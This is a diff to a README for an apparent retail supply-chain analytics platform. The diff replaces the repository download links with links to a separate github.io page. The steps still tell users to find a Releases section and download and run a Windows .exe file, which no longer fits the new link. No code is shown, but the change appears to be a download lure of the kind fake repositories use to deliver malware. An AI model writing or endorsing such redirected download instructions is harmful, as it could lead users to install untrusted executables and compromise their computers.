@@ -1,6 +1,6 @@
 # 📊 enterprise-retail-supply-chain-intelligence-platform - View retail data trends with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/angeecht321/enterprise-retail-supply-chain-intelligence-platform)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://angeecht321.github.io)
 
 This platform helps retail managers track supply chain performance. It uses historical sales records to show patterns in revenue, stock levels, and customer demand. The system processes data from large e-commerce databases to provide clear visual charts. You can use these insights to make better decisions for your store or warehouse operations.
 
@@ -18,7 +18,7 @@ Before you install this software, check that your computer meets these minimum s
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [project download page here](https://github.com/angeecht321/enterprise-retail-supply-chain-intelligence-platform).
+1. Visit the [project download page here](https://angeecht321.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the latest version link to display the files.
 4. Download the file ending in .exe to your computer.
